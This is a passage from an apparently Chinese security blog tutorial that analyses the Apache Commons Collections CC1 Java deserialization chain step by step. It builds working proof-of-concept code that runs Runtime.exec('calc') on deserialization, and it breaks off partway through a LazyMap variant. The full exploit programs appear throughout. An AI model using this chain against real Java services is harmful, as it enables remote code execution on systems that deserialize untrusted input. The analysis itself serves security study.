<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">                Object value = memberValue.getValue();</span><br><span class="line">                if (!(memberType.isInstance(value) ||</span><br><span class="line">                      value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br></pre></td></tr></table></figure></div>

<p>通过分析代码我们可以看到这个setvalue所在的for循环还有遍历map的功能，那这就很满足我们的要求</p>
<p>分析代码我们可以看到这个memberValue对象调用了这个setValue对象，那么只要这个memberValue可控,我们就可以将我们前边构造的transformedMap对象传入进去，那么再去调用setvalue方法就能够执行我们后面的利用链。</p>
<p>那我们现在就要去找这个memberValue是否可控</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    if (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != 1 ||</span><br><span class="line">        superInterfaces[0] != java.lang.annotation.Annotation.class)</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    this.type = type;</span><br><span class="line">    this.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过向上找我们可以看到这个memberValue是这个AnnotationInvocationHandler类的构造方法传递进来的</p>
<p>我们先分析一下这个构造方法接受的参数类型</p>
<p>Class&lt;? extends Annotation&gt; type：表示接受任何注解类型的 Class 对象</p>
<p>Map&lt;String, Object&gt; memberValues ：接受一个map类的class对象</p>
<p>通过分析我们可以知道这里的memberValue是可控的，而且接受的也是map类型的，那我们实例化一个AnnotationInvocationHandler对象，然后将我们前面构造的transformMap传进去，然后进行序列化，我们整条利用链就构造完成了。</p>
<p>但是我们可以看到这里的AnnotationInvocationHandler的构造方法并不是一个public方法，那就说明我们不能直接去获取它。</p>
<p>那么这里我们可以通过反射去实现：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationdhdlConstructor</span> <span class="operator">=</span>c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line"></span><br><span class="line">annotationInvocationdhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">Object o=annotationInvocationdhdlConstructor.newInstance(Override.class,transformedMap);<span class="comment">//实例化对象       </span></span><br></pre></td></tr></table></figure></div>

<p>我们上面分析了AnnotationInvocationHandler接受两个参数，其中有个事注解类型的，我们这里传了一个Override.class</p>
<p>因为这里这个注解里面是空的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717172439183.png"
                      alt="image-20230717172439183"
                ></p>
<p>经过上面我们已经将构造的transformedMap传进了AnnotationInvocationHandler的实例化对象中</p>
<p>那么正常情况到这里我们这条链就已经结束了，后面就是序列化和反序列化的调用了。</p>
<p>但是我们这里出现了几个问题：</p>
<h3 id="解决runtime不能序列化的问题"><a href="#解决runtime不能序列化的问题" class="headerlink" title="解决runtime不能序列化的问题"></a>解决runtime不能序列化的问题</h3><p>我们先看第一个问题：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">entry.setValue(r);</span><br></pre></td></tr></table></figure></div>

<p>这里的setValue我们要传就是我们上面定义的runtime对象</p>
<p>但是这个runtime是我们自己定义的</p>
<p>但是这个Runtiem类没有实现序列化接口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717182239367.png"
                      alt="image-20230717182239367"
                ></p>
<p>没有实现序列化接口说明这里不能够进行序列化</p>
<p>那么我们就不能直接调用它。</p>
<p>Runtime不能够序列化，但是Runtime.class是可以序列化的</p>
<p><code>Runtime.class</code> 是 Java 中的一个特殊的静态属性，表示 <code>java.lang.Runtime</code> 类的 Class 对象。对于 <code>java.lang.Runtime</code> 类来说，<code>Runtime.class</code> 就是表示该类的元数据信息的 <code>Class</code> 对象。它包含了有关 <code>Runtime</code> 类的结构、方法、字段等信息，可以用于反射操作，例如获取方法、调用方法、获取类名等。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717182857346.png"
                      alt="image-20230717182857346"
                ></p>
<p>我们可以看到这个是可以实例化的，他继承了序列化接口</p>
<p>那我们这里就可以通过反射来实例化Runtime对象</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c= Runtime.class;</span><br><span class="line">Method getRuntimeMethod=c.getMethod(&quot;getRuntime&quot;,null);</span><br><span class="line">Runtime r =(Runtime) getRuntimeMethod.invoke(null,null);</span><br><span class="line">Method execMethod =c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">execMethod.invoke(r,&quot;calc&quot;);</span><br></pre></td></tr></table></figure></div>

<p>在上面我们分析，InvokerTransformer中的transform方法可以实现反射的功能</p>
<p>那我们这里也可以通过invokerTransFormer来实现:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Method getRuntimeMethod =(Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="line">Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class,&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br></pre></td></tr></table></figure></div>

<p>分析这个代码我们可以看到其实就是transform的循环调用，那么我们传参的话就要把这几个类都要传进去，那么显然是很麻烦的，那么我们这里可以使用ChainedTransformer()类去简化这个操作。</p>
<p>我们先简单了解一下ChainedTransformer()类</p>
<p><code>ChainedTransformer</code> 是 Apache Commons Collections 库中的一个类，用于将多个转换器串联在一起形成一个转换器链。其实说白了就是将第一个转换器的结果当作第二个转换器的参数，依次类推.</p>
<p>那么它刚好符合我们上面通过InvokerTransformer实现反射的过程。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717203423697.png"
                      alt="image-20230717203423697"
                ></p>
<p>那么通过ChainedTransformer()实现就是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure></div>

<p>那么到这里我们的POC就应该是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ccitest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;key&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationdhdlConstructor =c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(true);</span><br><span class="line">        Object o=annotationInvocationdhdlConstructor.newInstance(Override.class,transformedMap);</span><br><span class="line">        </span><br><span class="line">        serializable(o);</span><br><span class="line">        unserializable();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="解决两个if判读问题"><a href="#解决两个if判读问题" class="headerlink" title="解决两个if判读问题"></a>解决两个if判读问题</h3><p>但是我们运行还是不能成功的，因为我们还有两个if判断没解决</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717210035063.png"
                      alt="image-20230717210035063"
                ></p>
<p>可以看到第一个if要求memberType不为空，但是根据变量值我们可以看到这里的memberType的值是空的，那么说明我们根本就没有走到setvalue</p>
<p>我们这里先分析一下这个memberType的值是怎么来的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">  AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        if (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != 1 ||</span><br><span class="line">            superInterfaces[0] != java.lang.annotation.Annotation.class)</span><br><span class="line">            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">        this.type = type;</span><br><span class="line">        this.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">     AnnotationType annotationType = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125;</span><br><span class="line">..........</span><br><span class="line"> Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes()</span><br><span class="line"> </span><br><span class="line">String name = memberValue.getKey();</span><br><span class="line"> Class&lt;?&gt; memberType = memberTypes.get(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>通过这个代码分析我们可以知道，这里的type是我们传入的AnnotationInvocationHandler第一个参数，也就是我们传入的注解，</p>
<p>这里就是通过 <code>AnnotationType</code> 类获取注解类型的成员名称和类型</p>
<p>重点在于这几行代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">annotationType = AnnotationType.getInstance(type);//获取注解对象</span><br><span class="line"> Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes()//获取注解类型的成员类型映射表</span><br><span class="line">String name = memberValue.getKey();//获取map键值对中的key</span><br><span class="line"> Class&lt;?&gt; memberType = memberTypes.get(name)//获取key对应在注解类型中的成员值</span><br></pre></td></tr></table></figure></div>

<p>这里给一个示例代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(ElementType.TYPE)</span><br><span class="line">@interface MyAnnotation &#123;</span><br><span class="line">    String value();</span><br><span class="line">    int count();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Map&lt;String, Object&gt; memberValues = new HashMap&lt;&gt;();</span><br><span class="line">        memberValues.put(&quot;count&quot;,10);</span><br><span class="line">    memberValues.put(&quot;key&quot;, &quot;value&quot;);</span><br><span class="line"></span><br><span class="line">        AnnotationType annotationType = AnnotationType.getInstance(MyAnnotation.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(annotationType);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">        System.out.println(memberTypes);</span><br><span class="line"></span><br><span class="line">        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            System.out.println(&quot;=====================================================&quot;);</span><br><span class="line">            System.out.println(memberValue);</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line"></span><br><span class="line">            System.out.println(name);</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            System.out.println(memberType);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718101622716.png"
                      alt="image-20230718101622716"
                ></p>
<p>那么我们想要memberType不为空，那么我输入的hashmap中的key要在注解中存在。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718101940622.png"
                      alt="image-20230718101940622"
                ></p>
<p>那么我们这里可以使用@Retention注解</p>
<p>其中存在一个成员方法value</p>
<p>那么我们只用让我们输入的hashmap中的key值为value。</p>
<p>即：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">map.put(&quot;value&quot;, &quot;value&quot;);</span><br></pre></td></tr></table></figure></div>

<p>那么修改后的POC就是</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ccitest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationdhdlConstructor =c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(true);</span><br><span class="line">        Object o=annotationInvocationdhdlConstructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serializable(o);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再次调试：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718102530567.png"
                      alt="image-20230718102530567"
                ></p>
<p>我们修改后的hashmap中的key值在注解中存在。那获取注解键值对对应的值就不会为空了。</p>
<p>那我们就满足了这个if</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object value = memberValue.getValue();</span><br><span class="line">if (!(memberType.isInstance(value) ||</span><br></pre></td></tr></table></figure></div>

<p>java.lang.Class类的isInstance()方法用于检查指定的对象是否兼容分配给该Class的实例。如果指定对象为非null，并且可以强制转换为此类的实例，则该方法返回true。否则返回false。</p>
<p>那么我们这个这里明显是不能强转的，所以这里我们就能直接过去。</p>
<p>但是我们这里运行还是会报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718103552703.png"
                      alt="image-20230718103552703"
                ></p>
<h3 id="解决setValue传入值不可控问题"><a href="#解决setValue传入值不可控问题" class="headerlink" title="解决setValue传入值不可控问题"></a>解决setValue传入值不可控问题</h3><p>出现报错的原因就是因为我们前面说的setvalue传入值不可控的问题</p>
<p>因为这里要传的value的值其实就是我们构造的runtime对象.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718103719820.png"
                      alt="image-20230718103719820"
                ></p>
<p>但是这里我们明显是不可控的</p>
<p>我们这里可以通过ConstantTransformer类来实现这个这一步：</p>
<p>我们在这里先大概了解ConstantTransformer：</p>
<p><code>ConstantTransformer</code> 是 Apache Commons Collections 库中的一个类，用于创建一个始终返回固定值的转换器。</p>
<p>在 <code>ConstantTransformer</code> 中，你可以指定一个固定的值作为转换器的输出。该转换器在应用 <code>transform</code> 方法时，始终返回这个固定的值。以下是 <code>ConstantTransformer</code> 的构造方法和主要方法：</p>
<p>构造方法：</p>
<ul>
<li><code>ConstantTransformer(Object constant)</code>：创建一个 <code>ConstantTransformer</code> 对象，使用指定的常量作为固定值。</li>
</ul>
<p>主要方法：</p>
<ul>
<li><code>transform(Object input)</code>：应用转换器，返回固定的值。</li>
</ul>
<p>通过使用 <code>ConstantTransformer</code>，你可以将一个固定值包装成一个转换器，用于在各种场景中进行转换操作。例如，你可以使用 <code>ConstantTransformer</code> 创建一个始终返回特定字符串的转换器，或者创建一个始终返回某个预定义对象的转换器。</p>
<p>示例代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc11 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 创建一个 ConstantTransformer，固定返回字符串 &quot;Hello, World!&quot;</span><br><span class="line">        Transformer constantTransformer = ConstantTransformer.getInstance(&quot;hello&quot;);</span><br><span class="line">        // 应用转换器，输出固定的值</span><br><span class="line">        String result = (String) constantTransformer.transform(&quot;input&quot;);</span><br><span class="line">        System.out.println(&quot;Result: &quot; + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们看一下源码中的ConstantTransformer的构造方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718110327568.png"
                      alt="image-20230718110327568"
                ></p>
<p>这里传入一个对象并赋值给 <code>iConstant</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718110424089.png"
                      alt="image-20230718110424089"
                ></p>
<p>第二个方法<code>transform</code> ，接收一个对象，然后直接返回 <code>iConstant</code>。</p>
<p>那我们可以把这里返回的iConstant对象修改为我们获取的Runtime.class对象，那么这里无论接受什么都会返回这个虚拟机对象</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                                annotationType.members().get(name))</span><br></pre></td></tr></table></figure></div>

<p>那我们这里接受这个AnnotationTypeMismatchExceptionProxy对象，在ConstantTransformer的transform方法下就直接返回了我们的虚拟机对象，解决了传入参数值不可控的问题</p>
<p>而且这里调用的也是transform方法，那么我们就可以写入到chainedTransformer中去循环调用。</p>
<h3 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h3><p>那么修改一下我们的POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class ccitest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationdhdlConstructor =c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(true);</span><br><span class="line">        Object o=annotationInvocationdhdlConstructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serializable(o);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    // 序列化</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718115431082.png"
                      alt="image-20230718115431082"
                ></p>
<p>计算机程序打开成功了，那么到这里我们这条链就已经构造完了</p>
<p>利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    AbstractInputCheckedMapDecorator.setValue()</span><br><span class="line">        TransformedMap.checkSetValue()</span><br><span class="line">          ChainedTransformer.transform()</span><br><span class="line">            ConstantTransformer.transform()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Class.getMethod()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Runtime.getRuntime()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Runtime.exec()</span><br></pre></td></tr></table></figure></div>

<h2 id="cc1-LazyMap-利用链分析"><a href="#cc1-LazyMap-利用链分析" class="headerlink" title="cc1 LazyMap 利用链分析"></a>cc1 LazyMap 利用链分析</h2><p> LazyMap 利用链和TranformedMap利用链后半部分都是一样的</p>
<p>这条链是ysoserial项目中的CC1利用链</p>
<p>我们在调用了InvokerTransformer类中的transform方法时，在第一条链中我们用的是TransformedMap方法中的checksetValue方法</p>
<p>但是Lazymap中的get方法也是可以利用的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718121037838.png"
                      alt="image-20230718121037838"
                ></p>
<p>跟进到LazyMap的get方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718121215884.png"
                      alt="image-20230718121215884"
                ></p>
<p>我们可以看到这里factory调用了transform方法，key是get方法传入的，是可控的</p>
<p>向上找看factory是否可控</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718121513387.png"
                      alt="image-20230718121513387"
                ></p>
<p>在LazyMap的构造方法中找到了factory的传参</p>
<p>但是这个方法是受保护的方法，我们不能直接调用</p>
<p>继续找看有没有能够调用这个方法的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718121636115.png"
                      alt="image-20230718121636115"
                ></p>
<p>可以看到这里有一个静态方法decorate调用了Lazymap的构造方法，，并且参数完全可控</p>
<p>到这里为止，这条链子和我们TranformedMap的利用链是非常相似的</p>
<p>那我这里就可以调用decorate静态方法进而调用LazyMap的构造方法，从而是factory可控，进而调用transform()方法</p>
<p>那我们这里可以编写POC:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ccitest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt;  lazyMap = LazyMap.decorate(map, null, chainedTransformer);</span><br></pre></td></tr></table></figure></div>

<p>前面的代码都是一样的，只用这里修改为 LazyMap</p>
